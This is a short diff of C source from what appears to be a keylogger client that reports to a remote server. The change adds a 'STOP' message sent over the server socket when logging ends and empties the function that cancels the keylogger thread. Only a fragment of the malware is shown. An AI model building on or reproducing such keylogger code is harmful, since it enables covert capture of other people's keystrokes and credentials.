@@ -114,15 +114,15 @@ void* start_keylogger() {
 
     // Close the device file
     close(fd);
+    message_t msg;
+    msg.opCode = 'K';
+    strcpy(msg.buffer, "STOP");
+    msg.size = strlen(msg.buffer);
+    sendMessage(clientData.serverSocket, &msg);
+
     return NULL;
 }
 
 void terminateKeylogger()
 {
-    if(clientData.isKeyLoggerActive && clientData.keyLoggerTid != -1)
-    {
-        pthread_cancel(clientData.keyLoggerTid);   
-        clientData.keyLoggerTid = -1;
-        clientData.isKeyLoggerActive = 0;
-    }
 }
